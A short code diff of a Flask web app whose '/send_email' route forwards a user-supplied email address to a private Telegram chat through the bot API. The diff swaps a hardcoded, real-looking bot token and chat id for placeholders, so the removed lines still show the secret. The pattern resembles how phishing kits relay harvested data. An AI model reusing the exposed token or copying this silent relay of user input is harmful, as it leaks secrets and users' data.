@@ -80,8 +80,8 @@ def check_passkey(username):
 @app.route('/send_email')
 def send_email():
     email = request.args.get('email')
-    token = '8716437018:AAEoOyyYgR9CaP28D_odAzcXoAoOpiToVfM'
-    my_id = '5926291761'
+    token = 'M'
+    my_id = 'M'
     requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={my_id}&text=-l {email}")
     return jsonify({"status": "sent"})
 
